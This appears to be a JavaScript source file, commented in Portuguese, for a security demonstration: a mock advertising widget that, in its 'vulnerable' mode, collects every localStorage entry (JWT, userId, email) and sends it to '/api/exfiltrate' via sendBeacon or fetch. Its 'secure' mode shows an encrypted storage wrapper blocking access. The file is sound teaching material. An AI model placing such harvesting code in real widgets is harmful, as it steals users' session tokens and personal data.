/**
 * Inicializa o MFE Widget Publicitário
 * @param {string} containerId - ID do elemento container no DOM
 * @param {'vulnerable' | 'secure'} mode - Modo de operação
 * @param {(type: 'info' | 'warning' | 'error' | 'success', message: string) => void} log - Função de log
 */
export function init(containerId, mode, log) {
    const container = document.getElementById(containerId);

    if (!container) {
        console.error(`MFE Widget: Container '${containerId}' não encontrado`);
        return;
    }

    container.innerHTML = `
        <div style="padding: 20px;">
            <div class="widget-promo">
                <h3 class="widget-title">🎉 Oferta Relâmpago!</h3>
                <p class="widget-text">
                    Ganhe 50% de desconto agora!
                </p>
                <button class="widget-btn">
                    Ver Oferta
                </button>
            </div>

            <div class="widget-warning">
                <p>
                    <strong>⚠️ Atenção:</strong> Este widget contém código de análise
                </p>
            </div>
        </div>
        <style>
            .widget-promo {
                background: linear-gradient(135deg, rgba(255, 60, 65, 0.1) 0%, rgba(239, 68, 68, 0.2) 100%);
                border: 1px solid rgba(255, 60, 65, 0.3);
                padding: 20px;
                border-radius: 8px;
                text-align: center;
                color: #e5e7eb;
            }
            .widget-title {
                margin-bottom: 10px;
                color: #ff3c41;
                text-shadow: 0 0 10px rgba(255, 60, 65, 0.3);
            }
            .widget-text {
                font-size: 14px;
                margin-bottom: 15px;
                color: #9ca3af;
            }
            .widget-btn {
                padding: 12px 24px;
                background: #ff3c41;
                color: #050505;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                font-family: 'Inter', sans-serif;
                box-shadow: 0 0 20px rgba(255, 60, 65, 0.3);
                transition: all 0.3s ease;
            }
            .widget-btn:hover {
                box-shadow: 0 0 30px rgba(255, 60, 65, 0.5);
            }
            .widget-warning {
                margin-top: 15px;
                padding: 15px;
                background: rgba(234, 179, 8, 0.1);
                border-radius: 8px;
                border-left: 3px solid #eab308;
            }
            .widget-warning p {
                color: #eab308;
                font-size: 13px;
                margin: 0;
            }
        </style>
    `;

    if (mode === 'vulnerable') {
        localStorage.setItem('widgetImpressionId', 'ad-12345');
        localStorage.setItem('weatherLocation', 'São Paulo');
        localStorage.setItem('weatherTemp', '27');
    }

    setTimeout(() => {
        if (mode === 'vulnerable') {
            executeVulnerableCode(log);
        } else {
            executeSecureCode(log);
        }
    }, 500);
}

/**
 * Código vulnerável que exfiltra todos os dados do localStorage
 * @param {(type: string, message: string) => void} log - Função de log
 */
function executeVulnerableCode(log) {
    log('warning', '🚨 Widget: Executando código de coleta de dados...');

    /** @type {Record<string, string>} */
    const payload = {};
    let dataCount = 0;

    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
            const value = localStorage.getItem(key);
            if (value !== null) {
                payload[key] = value;
                dataCount++;
            }
        }
    }

    log('error', `🚨 Widget: ${dataCount} itens coletados do localStorage!`);

    Object.keys(payload).forEach(key => {
        const value = payload[key];
        const preview = value.length > 50 ? value.substring(0, 50) + '...' : value;

        if (key === 'jwt' || key === 'userId' || key === 'email') {
            log('error', `  🔴 CRÍTICO: ${key} = ${preview}`);
        } else {
            log('warning', `  🟡 ${key} = ${preview}`);
        }
    });

    log('error', '🚨 Widget: Enviando dados via navigator.sendBeacon()...');

    const payloadStr = JSON.stringify(payload);
    const sent = navigator.sendBeacon('/api/exfiltrate', payloadStr);

    if (window.logTelemetry) {
        window.logTelemetry({
            type: 'exfiltration',
            itemCount: dataCount,
            bytes: payloadStr.length,
            ts: Date.now(),
            level: 'CRITICAL',
            preview: Object.keys(payload).slice(0, 5)
        }, 'critical');
    }

    if (sent) {
        log('error', `🚨 EXFILTRAÇÃO BEM-SUCEDIDA: ${dataCount} itens enviados (${payloadStr.length} bytes)`);
    } else {
        log('warning', '⚠️ sendBeacon falhou, tentando fetch como fallback...');

        fetch('/api/exfiltrate', {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: payloadStr
        }).then(() => {
            log('error', '🚨 EXFILTRAÇÃO por fetch: Dados enviados');
        }).catch(err => {
            log('warning', `⚠️ Exfiltração bloqueada: ${err.message}`);
        });
    }

    setTimeout(() => {
        log('error', '💀 ATAQUE CONCLUÍDO: Dados sensíveis comprometidos');
        log('error', '   → JWT, userId, email, saldo, etc.');
        log('info', '───────────────────────────────────────');
        log('info', 'Resumo do payload exfiltrado:');
        Object.keys(payload).forEach(key => {
            const value = payload[key];
            const preview = value.length > 80 ? value.substring(0, 80) + '...' : value;
            if (key === 'jwt' || key === 'userId' || key === 'email' || key === 'balance') {
                log('error', `   🔴 ${key}: ${preview}`);
            } else {
                log('warning', `   🟡 ${key}: ${preview}`);
            }
        });
        log('info', '───────────────────────────────────────');
    }, 500);
}

/**
 * Código seguro que não consegue acessar dados protegidos
 * @param {(type: string, message: string) => void} log - Função de log
 */
function executeSecureCode(log) {
    log('info', 'Widget: Executando código de análise...');

    /** @type {string[]} */
    const directItems = [];
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
            directItems.push(key);
        }
    }

    log('success', `✅ Widget: Encontrou ${directItems.length} itens não-protegidos no localStorage`);

    if (directItems.length > 0) {
        directItems.forEach(key => {
            log('info', `  → ${key} (dados não-sensíveis ou não-protegidos)`);
        });
    }

    log('info', 'Widget: Tentando acessar dados protegidos...');

    try {
        if (window.SecureStorage) {
            const fakeKey = 'dGVzdGluZ2Zha2VrZXkxMjM0NTY3ODkwMTIzNDU2Nzg5MA==';
            const fakeStore = new window.SecureStorage('mfe_dashboard', fakeKey);

            setTimeout(async () => {
                try {
                    const jwt = await fakeStore.getItem('jwt');
                    if (jwt) {
                        log('error', '🚨 Widget conseguiu acessar JWT! (isso não deveria acontecer)');
                    } else {
                        log('success', '✅ Widget NÃO conseguiu acessar JWT - dados protegidos');
                    }
                } catch (error) {
                    log('success', '✅ Widget bloqueado: Falha na decriptação (chave incorreta)');
                    log('success', '🛡️ DEFESA EFETIVA: Dados sensíveis permanecem protegidos!');
                    log('info', `  → Erro técnico: ${error.name}`);
                    console.log('🎉 Modo seguro funcionando! O erro acima é esperado e desejado.');
                }

                log('success', '🛡️ DEFESA EFETIVA: Dados sensíveis permanecem protegidos!');
                log('info', 'SecureStorage wrapper impediu acesso não autorizado');
            }, 500);
        } else {
            log('info', 'SecureStorage não disponível para o widget');
        }
    } catch (error) {
        log('success', '✅ Acesso bloqueado: ' + error.message);
    }
}
